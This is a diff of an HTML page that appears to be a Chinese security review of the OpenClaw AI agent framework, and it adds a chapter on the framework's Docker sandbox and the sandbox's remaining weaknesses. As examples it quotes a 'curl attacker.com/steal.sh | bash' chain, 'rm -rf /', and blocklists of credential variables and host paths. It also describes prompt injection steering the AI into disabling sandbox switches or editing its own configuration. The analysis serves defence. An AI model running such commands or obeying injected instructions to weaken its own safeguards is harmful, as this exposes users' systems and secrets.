@@ -6,86 +6,87 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
   <title> </title>
   <style>
-code{white-space: pre-wrap;}
-span.smallcaps{font-variant: small-caps;}
-div.columns{display: flex; gap: min(4vw, 1.5em);}
-div.column{flex: auto; overflow-x: auto;}
-div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
-
-ul.task-list[class]{list-style: none;}
-ul.task-list li input[type="checkbox"] {
-font-size: inherit;
-width: 0.8em;
-margin: 0 0.8em 0.2em -1.6em;
-vertical-align: middle;
-}
-.display.math{display: block; text-align: center; margin: 0.5rem auto;}
-
-pre > code.sourceCode { white-space: pre; position: relative; }
-pre > code.sourceCode > span { line-height: 1.25; }
-pre > code.sourceCode > span:empty { height: 1.2em; }
-.sourceCode { overflow: visible; }
-code.sourceCode > span { color: inherit; text-decoration: inherit; }
-div.sourceCode { margin: 1em 0; }
-pre.sourceCode { margin: 0; }
-@media screen {
-div.sourceCode { overflow: auto; }
-}
-@media print {
-pre > code.sourceCode { white-space: pre-wrap; }
-pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
-}
-pre.numberSource code
-{ counter-reset: source-line 0; }
-pre.numberSource code > span
-{ position: relative; left: -4em; counter-increment: source-line; }
-pre.numberSource code > span > a:first-child::before
-{ content: counter(source-line);
-position: relative; left: -1em; text-align: right; vertical-align: baseline;
-border: none; display: inline-block;
--webkit-touch-callout: none; -webkit-user-select: none;
--khtml-user-select: none; -moz-user-select: none;
--ms-user-select: none; user-select: none;
-padding: 0 4px; width: 4em;
-color: #aaaaaa;
-}
-pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa; padding-left: 4px; }
-div.sourceCode
-{ }
-@media screen {
-pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
-}
-code span.al { color: #ff0000; font-weight: bold; } 
-code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } 
-code span.at { color: #7d9029; } 
-code span.bn { color: #40a070; } 
-code span.bu { color: #008000; } 
-code span.cf { color: #007020; font-weight: bold; } 
-code span.ch { color: #4070a0; } 
-code span.cn { color: #880000; } 
-code span.co { color: #60a0b0; font-style: italic; } 
-code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } 
-code span.do { color: #ba2121; font-style: italic; } 
-code span.dt { color: #902000; } 
-code span.dv { color: #40a070; } 
-code span.er { color: #ff0000; font-weight: bold; } 
-code span.ex { } 
-code span.fl { color: #40a070; } 
-code span.fu { color: #06287e; } 
-code span.im { color: #008000; font-weight: bold; } 
-code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } 
-code span.kw { color: #007020; font-weight: bold; } 
-code span.op { color: #666666; } 
-code span.ot { color: #007020; } 
-code span.pp { color: #bc7a00; } 
-code span.sc { color: #4070a0; } 
-code span.ss { color: #bb6688; } 
-code span.st { color: #4070a0; } 
-code span.va { color: #19177c; } 
-code span.vs { color: #4070a0; } 
-code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } 
-</style>
-  <link href="data:application/octet-stream;base64," rel="stylesheet" />
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="/dev/null" />
 
 <style>
   body {
@@ -418,7 +419,8 @@ WebSocket</strong>：监控器持续检查各个通讯通道（Telegram bot
 <code>OPENCLAW_GATEWAY_TOKEN</code> 设置。验证时，OpenClaw
 不直接比较字符串，而是先用 SHA-256 把两边都哈希一遍，再用 Node.js 的
 <code>crypto.timingSafeEqual</code> 做恒时间比较：</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// secret-equal.ts — 一共就 13 行</span></span>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// secret-equal.ts — 一共就 13 行</span></span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> hash <span class="op">=</span> (s) <span class="kw">=&gt;</span> <span class="fu">createHash</span>(<span class="st">&quot;sha256&quot;</span>)<span class="op">.</span><span class="fu">update</span>(s)<span class="op">.</span><span class="fu">digest</span>()<span class="op">;</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> <span class="fu">timingSafeEqual</span>(<span class="fu">hash</span>(provided)<span class="op">,</span> <span class="fu">hash</span>(expected))<span class="op">;</span></span></code></pre></div>
 <p>这么做是为了防”时序攻击”——如果用普通的 <code>===</code>
@@ -457,7 +459,8 @@ API Key
 <p><strong>怎么实现的：</strong></p>
 <p><code>dm-policy-shared.ts</code>（333 行）。DM
 和群聊分开配置。配置项写在 <code>config.yaml</code> 的各通道设置里：</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">telegram</span><span class="kw">:</span></span>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">telegram</span><span class="kw">:</span></span>
 <span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="kw">-</span><span class="at"> </span><span class="fu">botToken</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;xxx&quot;</span></span>
 <span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">dmPolicy</span><span class="kw">:</span><span class="at"> </span><span class="st">&quot;allowlist&quot;</span><span class="co">         # 只回名单上的人</span></span>
 <span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">allowFrom</span><span class="kw">:</span><span class="at"> </span><span class="kw">[</span><span class="st">&quot;123456789&quot;</span><span class="kw">]</span><span class="co">      # Telegram 用户 ID</span></span>
@@ -471,7 +474,7 @@ store）。</p>
 <ul>
 <li><strong>“open” 模式等同于缺乏访问控制</strong>：如果将 Bot
 接入公开群组，且配置了
-<code>groupPolicy: &quot;open&quot;</code>，群内所有人都能调用你的 API
+<code>groupPolicy: "open"</code>，群内所有人都能调用你的 API
 消费额度，极易导致意外超支。<strong>注意：同上，如果缺乏对 Agent
 的越权限制，群内成员也可以通过聊天指令直接篡改或放行访问控制规则。</strong></li>
 <li><strong>Pairing store 是 JSON
@@ -582,8 +585,8 @@ WebSocket 连接。</p>
 系统完全沦陷</strong>。如果攻击者能修改
 <code>config.yaml</code>（比如通过一个文件写入漏洞），他可以：
 <ul>
-<li>把 <code>auth.mode</code> 改成 <code>&quot;none&quot;</code> → 关闭认证</li>
-<li>把 <code>allowFrom</code> 改成 <code>[&quot;*&quot;]</code> →
+<li>把 <code>auth.mode</code> 改成 <code>"none"</code> → 关闭认证</li>
+<li>把 <code>allowFrom</code> 改成 <code>["*"]</code> →
 对所有人开放</li>
 <li>在 <code>hooks.mappings</code> 里注入恶意 <code>transform</code>
 模块</li>
@@ -894,7 +897,7 @@ AI 执行写文件操作，达到对配置相关逻辑的越权。</li>
 <li><p><strong>Shell
 链式命令存在绕过几率</strong>。在执行组合任务环节，AI
 容易产生包含联结机制的动作链（形似
-<code>echo &quot;安全&quot; &amp;&amp; curl attacker.com/steal.sh | bash</code>
+<code>echo "安全" &amp;&amp; curl attacker.com/steal.sh | bash</code>
 ）。即便是程序通过切分动作限制了其中多数基础符号规则执行，若操作环境囊括进了带有变量展开语义嵌套特征或是子引用执行逻辑（比如
 <code>npm run $(curl ...)</code>
 ），当前的静态分析判定正则仍存在被逃逸的缺陷。</p></li>
@@ -937,7 +940,8 @@ Agent
 <li><p><strong>静态扫描的常规盲区</strong>。动态产生的动作命令大都能轻易跨越静态机制规避被检出。值得一提的是，有部分
 Skill 提供方向外扩展业务功能的方式为引入特定的 API 授权操作 ——
 即程序需要实时依靠远端内容回调更新方能读取准确机制结构进行调用。<strong>此处的业务逻辑即已授权第三方服务控制该底层资源环境的执行权</strong>。若下发的服务网络环节遭遇阻击拦截或者上游本身遭到污染影响操作规则输出，这些潜藏问题都会导致广泛且极快的注入蔓延。对此形式的渗透破坏难以借助前置脚本执行状态获得有效的检验：</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 扫描器能检测到:</span></span>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 扫描器能检测到:</span></span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="pp">require</span>(<span class="st">&quot;child_process&quot;</span>)<span class="op">.</span><span class="fu">exec</span>(<span class="st">&quot;rm -rf /&quot;</span>)</span>
 <span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="co">// 扫描器检测不到:</span></span>
@@ -1392,7 +1396,7 @@ Prompt
 <li><strong>Scope 只限制了搜索，不限制 AI 的”记忆”</strong>。AI
 在群聊中虽然搜不到私人记忆，但如果之前的对话上下文中已经包含了私人信息（比如你先在私聊中讨论了敏感话题，然后切到群聊），AI
 可能会从上下文中”想起”这些信息并在群聊中泄露</li>
-<li><strong>默认策略是”允许”</strong>。<code>scope.default = &quot;allow&quot;</code>
+<li><strong>默认策略是”允许”</strong>。<code>scope.default = "allow"</code>
 意味着如果你没有主动配置 Scope
 规则，所有场景都能搜索所有记忆——包括群聊中的其他人</li>
 <li><strong>Scope
@@ -2014,7 +2018,7 @@ Prompt Injection 控制的 AI）可以自由往 Memory 写入任何内容</td>
 <td>Scope 默认允许</td>
 <td>⚠️ <strong>有告警</strong></td>
 <td>审计引擎 CHAN 系列会告警通道安全问题，但
-<code>scope.default = &quot;allow&quot;</code> 本身不在审计范围内</td>
+<code>scope.default = "allow"</code> 本身不在审计范围内</td>
 </tr>
 <tr class="even">
 <td>远程嵌入暴露数据</td>
@@ -2105,8 +2109,210 @@ Prompt Injection 控制的 AI）可以自由往 Memory 写入任何内容</td>
 真正的防线在于 AI 的行为不可完全控制——这是所有 AI Agent
 框架面临的根本困境。</p>
 <hr />
-<h2 id="七总结与评价">七、总结与评价</h2>
-<h3 id="整体评价在开源-ai-agent-框架中什么水平">7.1 整体评价：在开源 AI
+<h2 id="七沙盒模式容器级安全隔离">七、沙盒模式——容器级安全隔离</h2>
+<p>前面几章分析了不少风险，读者可能会问：这些问题 OpenClaw
+自己就没有考虑吗？实际上，框架提供了一套比较完整的 <strong>Docker
+沙盒隔离机制</strong>（<code>src/agents/sandbox/</code>，约 50
+个源文件），专门用于将 AI
+的工具执行限制在容器内，从而收窄攻击面。这一章我们来看看它是如何实现的，以及它的能力边界在哪里。</p>
+<h3 id="沙盒的核心架构">7.1 沙盒的核心架构</h3>
+<pre><code>┌─────────────────────────────────────────────────┐
+│                  宿主机 (Host)                    │
+│                                                   │
+│  ┌─────────────┐       ┌───────────────────────┐ │
+│  │  OpenClaw    │       │   Docker Container    │ │
+│  │  Gateway     │       │   (sandbox)           │ │
+│  │             │──────▶│  --read-only           │ │
+│  │  LLM 调用   │ exec  │  --cap-drop ALL        │ │
+│  │  工具调度   │       │  --no-new-privileges   │ │
+│  │  Prompt 处理 │       │  --network none        │ │
+│  │             │◀──────│  --tmpfs /tmp,/var/tmp  │ │
+│  └─────────────┘ stdout │  --seccomp default     │ │
+│                         └───────────────────────┘ │
+└─────────────────────────────────────────────────┘</code></pre>
+<p><strong>工作原理：</strong> - Gateway 进程本身运行在宿主机上，负责
+LLM 调用和 Prompt 处理 - 当 AI
+需要执行工具操作（文件读写、命令执行等）时，操作被转发到 Docker
+容器内执行 - 容器以严格安全策略创建：只读根文件系统、丢弃全部 Linux
+capabilities、禁止获取新权限、默认无网络 - 支持 per-agent 和 per-session
+粒度的独立容器</p>
+<h3 id="安全校验机制">7.2 安全校验机制</h3>
+<p><code>validate-sandbox-security.ts</code>（344
+行）实现了一系列运行时校验，在容器创建前强制执行：</p>
+<p><strong>路径挂载黑名单：</strong></p>
+<div class="sourceCode" id="cb34"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> BLOCKED_HOST_PATHS <span class="op">=</span> [</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;/etc&quot;</span><span class="op">,</span> <span class="st">&quot;/proc&quot;</span><span class="op">,</span> <span class="st">&quot;/sys&quot;</span><span class="op">,</span> <span class="st">&quot;/dev&quot;</span><span class="op">,</span> <span class="st">&quot;/root&quot;</span><span class="op">,</span> <span class="st">&quot;/boot&quot;</span><span class="op">,</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;/run&quot;</span><span class="op">,</span> <span class="st">&quot;/var/run&quot;</span><span class="op">,</span> <span class="st">&quot;/run/docker.sock&quot;</span><span class="op">,</span>    <span class="co">// 阻止 Docker 逃逸</span></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;/private/etc&quot;</span><span class="op">,</span> <span class="st">&quot;/private/var/run&quot;</span><span class="op">,</span>         <span class="co">// macOS 路径</span></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a>]<span class="op">;</span></span></code></pre></div>
+<p><strong>安全 profile 校验：</strong> - 阻止 seccomp 设为
+<code>unconfined</code>（否则会移除系统调用过滤） - 阻止 AppArmor 设为
+<code>unconfined</code>（否则会移除强制访问控制） - 阻止 network 设为
+<code>host</code>（否则容器直接共享宿主机网络栈）</p>
+<p><strong>symlink 逃逸防护：</strong>
+校验绑定挂载的源路径时，不仅做字符串比较，还会通过
+<code>resolveSandboxHostPathViaExistingAncestor</code>
+解析真实路径，防止攻击者通过 <code>/home/user/link -&gt; /etc</code>
+这种软链接绕过黑名单。</p>
+<h3 id="文件系统桥接">7.3 文件系统桥接</h3>
+<p><code>fs-bridge.ts</code>（354
+行）负责在容器内执行文件操作。所有文件读写都通过
+<code>docker exec</code> 在容器内运行 shell 脚本完成：</p>
+<div class="sourceCode" id="cb35"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 写文件的流程：</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="co">// 1. 在目标目录创建临时文件</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="co">// 2. 通过 stdin 将内容写入临时文件</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="co">// 3. 原子性 rename 到目标路径</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="co">// 4. 失败则清理临时文件</span></span></code></pre></div>
+<p><strong>关键安全机制：</strong> - <code>SandboxFsPathGuard</code>
+在每次操作前做路径安全校验 - 写入前检查 <code>workspaceAccess</code>
+权限：默认 <code>"none"</code> 意味着容器完全无法写入工作区 -
+读取操作通过 <code>openReadableFile</code> 先获取 fd 再读取，防止 TOCTOU
+竞态</p>
+<h3 id="环境变量清洗">7.4 环境变量清洗</h3>
+<p><code>sanitize-env-vars.ts</code>（111
+行）在创建容器时过滤宿主机环境变量：</p>
+<div class="sourceCode" id="cb36"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 黑名单正则（部分）：</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ss">/</span><span class="sc">^</span><span class="ss">ANTHROPIC_API_KEY</span><span class="sc">$</span><span class="ss">/i</span></span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="ss">/</span><span class="sc">^</span><span class="ss">OPENAI_API_KEY</span><span class="sc">$</span><span class="ss">/i</span></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ss">/</span><span class="sc">^</span><span class="ss">TELEGRAM_BOT_TOKEN</span><span class="sc">$</span><span class="ss">/i</span></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="ss">/_</span><span class="sc">?(</span><span class="ss">API_KEY</span><span class="sc">|</span><span class="ss">TOKEN</span><span class="sc">|</span><span class="ss">PASSWORD</span><span class="sc">|</span><span class="ss">PRIVATE_KEY</span><span class="sc">|</span><span class="ss">SECRET</span><span class="sc">)$</span><span class="ss">/i</span></span></code></pre></div>
+<p>此外还检测可疑值：包含 null 字节的变量直接拦截，超长或疑似 base64
+编码的凭据数据会产生告警。</p>
+<h3 id="潜在安全风险分析">7.5 潜在安全风险分析</h3>
+<p>以上机制的工程质量在同类开源框架中属于上乘，但经过详细的代码审查，仍可以识别出以下潜在风险：</p>
+<p><strong>风险 1：默认关闭</strong></p>
+<div class="sourceCode" id="cb37"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="co">// config.ts:191</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>mode<span class="op">:</span> agentSandbox<span class="op">?.</span><span class="at">mode</span> <span class="op">??</span> agent<span class="op">?.</span><span class="at">mode</span> <span class="op">??</span> <span class="st">&quot;off&quot;</span><span class="op">,</span></span></code></pre></div>
+<p>沙盒模式默认为
+<code>off</code>。如果用户未显式配置，所有工具操作将直接在宿主机上执行。许多用户可能并不了解这一配置的存在。</p>
+<p><strong>风险 2：三个 <code>dangerouslyAllow*</code>
+旁路开关</strong></p>
+<div class="sourceCode" id="cb38"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>DANGEROUS_SANDBOX_DOCKER_BOOLEAN_KEYS <span class="op">=</span> [</span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;dangerouslyAllowReservedContainerTargets&quot;</span><span class="op">,</span></span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;dangerouslyAllowExternalBindSources&quot;</span><span class="op">,</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;dangerouslyAllowContainerNamespaceJoin&quot;</span><span class="op">,</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>]</span></code></pre></div>
+<p>这些配置项存在于 <code>config.yaml</code> 中。一旦被设为
+<code>true</code>，沙盒的核心隔离机制（路径限制、网络隔离）将被完全绕过。结合前面提到的
+<code>config.yaml</code> 可被 AI
+修改的问题——这意味着攻击者理论上可以通过 Prompt 注入让 AI
+打开这些开关。</p>
+<p><strong>风险 3：<code>workspaceAccess: "rw"</code>
+模式下的配置篡改</strong></p>
+<div class="sourceCode" id="cb39"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a>workspaceAccess<span class="op">:</span> agentSandbox<span class="op">?.</span><span class="at">workspaceAccess</span> <span class="op">??</span> agent<span class="op">?.</span><span class="at">workspaceAccess</span> <span class="op">??</span> <span class="st">&quot;none&quot;</span><span class="op">,</span></span></code></pre></div>
+<p>默认为 <code>"none"</code> 是安全的。但实际使用中，AI
+如果需要编辑项目代码，就需要设成 <code>"rw"</code>。此时容器内的 AI
+<strong>仍然可以修改工作区内的
+<code>SOUL.md</code>、<code>AGENTS.md</code>
+等系统级配置文件</strong>。沙盒只保护宿主机系统目录（<code>/etc</code>、<code>/proc</code>
+等），不保护工作区内的敏感文件。</p>
+<p><strong>风险 4：环境变量过滤非默认 strict 模式</strong></p>
+<div class="sourceCode" id="cb40"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (options<span class="op">.</span><span class="at">strictMode</span> <span class="op">&amp;&amp;</span> <span class="op">!</span><span class="fu">matchesAnyPattern</span>(key<span class="op">,</span> allowedPatterns)) {</span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a>  blocked<span class="op">.</span><span class="fu">push</span>(key)<span class="op">;</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>非 <code>strictMode</code>
+下，只有匹配黑名单正则的变量才会被拦截。用户自定义变量名（如
+<code>MY_DB_CONN_STRING</code>）只要不包含
+<code>PASSWORD</code>/<code>SECRET</code>/<code>TOKEN</code>
+等关键词，就会被原样传入容器内。</p>
+<p><strong>风险 5：浏览器沙盒默认可联网</strong></p>
+<div class="sourceCode" id="cb41"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 主容器：network: &quot;none&quot;（安全）</span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="co">// 浏览器容器：network: &quot;bridge&quot;（可联网）</span></span></code></pre></div>
+<p>如果攻击者能控制浏览器沙盒内的操作，可发起对外网络请求，存在数据外泄通道。</p>
+<p><strong>风险 6：<code>setupCommand</code> 缺乏额外校验</strong></p>
+<div class="sourceCode" id="cb42"><pre
+class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (cfg<span class="op">.</span><span class="at">setupCommand</span><span class="op">?.</span><span class="fu">trim</span>()) {</span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">await</span> <span class="fu">execDocker</span>([<span class="st">&quot;exec&quot;</span><span class="op">,</span> <span class="st">&quot;-i&quot;</span><span class="op">,</span> name<span class="op">,</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">,</span> <span class="st">&quot;-lc&quot;</span><span class="op">,</span> cfg<span class="op">.</span><span class="at">setupCommand</span>])<span class="op">;</span></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>容器创建后执行的初始化命令直接通过 shell 运行，如果
+<code>config.yaml</code> 被篡改，攻击者可以注入任意初始化脚本。</p>
+<p><strong>风险 7：LLM 回复通道的数据泄露——沙盒的根本性盲区</strong></p>
+<p>即使在沙盒模式下，<strong>数据泄露的主要通道不是网络，而是 LLM
+的回复</strong>。AI
+可以在容器内读取工作区的敏感文件（<code>workspaceAccess: "rw"</code>
+时），然后通过对话回复将内容发送给攻击者。这条通道完全不经过容器的网络层，沙盒无法拦截。</p>
+<h3 id="沙盒能解决前文哪些问题">7.6 沙盒能解决前文哪些问题？</h3>
+<table>
+<thead>
+<tr class="header">
+<th>前文风险</th>
+<th style="text-align: center;">沙盒能否缓解</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>file_write</code> 写宿主任意路径</td>
+<td style="text-align: center;">✅</td>
+<td>容器内文件系统隔离</td>
+</tr>
+<tr class="even">
+<td>命令执行逃逸到宿主</td>
+<td style="text-align: center;">✅</td>
+<td>命令在容器内运行</td>
+</tr>
+<tr class="odd">
+<td><code>config.yaml</code> 被 AI 修改</td>
+<td style="text-align: center;">✅</td>
+<td>配置文件在宿主机，容器无法直接访问</td>
+</tr>
+<tr class="even">
+<td><code>exec-approvals.json</code> 被篡改</td>
+<td style="text-align: center;">✅</td>
+<td>同上</td>
+</tr>
+<tr class="odd">
+<td>Skill 恶意代码执行</td>
+<td style="text-align: center;">✅</td>
+<td>在容器内执行，爆炸半径受限</td>
+</tr>
+<tr class="even">
+<td>Prompt 注入</td>
+<td style="text-align: center;">❌</td>
+<td>LLM 认知层面问题，与运行环境无关</td>
+</tr>
+<tr class="odd">
+<td><code>SOUL.md</code> 被修改</td>
+<td style="text-align: center;">⚠️</td>
+<td><code>workspaceAccess: "rw"</code> 时仍可被篡改</td>
+</tr>
+<tr class="even">
+<td>记忆明文存储</td>
+<td style="text-align: center;">❌</td>
+<td>Memory 文件在宿主机，沙盒不改变存储方式</td>
+</tr>
+<tr class="odd">
+<td>上下文压缩丢失安全指令</td>
+<td style="text-align: center;">❌</td>
+<td>LLM 内部行为</td>
+</tr>
+<tr class="even">
+<td>记忆污染（Compaction 注入）</td>
+<td style="text-align: center;">❌</td>
+<td>LLM 决定写入内容</td>
+</tr>
+<tr class="odd">
+<td>跨 Agent Prompt 传播</td>
+<td style="text-align: center;">❌</td>
+<td>Agent 间消息传递在逻辑层</td>
+</tr>
+</tbody>
+</table>
+<p><strong>小结：</strong> 沙盒解决的是”AI
+的手脚伸得太长”的问题——把工具执行关进容器，限制爆炸半径。但前文分析的最核心、最难防的问题——Prompt
+注入、记忆污染、模型行为不可控——本质上都是 LLM
+认知层面的安全问题，与代码运行在哪个环境里关系不大。这也进一步说明了：<strong>真正的终极防线不在容器隔离，而在数据本身的加密、模型行为的可验证性，以及更细粒度的权限治理</strong>。</p>
+<hr />
+<h2 id="八总结与评价">八、总结与评价</h2>
+<h3 id="整体评价在开源-ai-agent-框架中什么水平">8.1 整体评价：在开源 AI
 Agent 框架中什么水平？</h3>
 <p>先说结论：<strong>OpenClaw 的安全设计在开源 AI Agent
 框架中属于领先水平。</strong></p>
@@ -2142,7 +2348,7 @@ Agent 框架中什么水平？</h3>
   ❌ Prompt Injection 没有根本解决方案（这是行业难题）
   ❌ 审计是&quot;建议性&quot;的——critical 不阻止启动
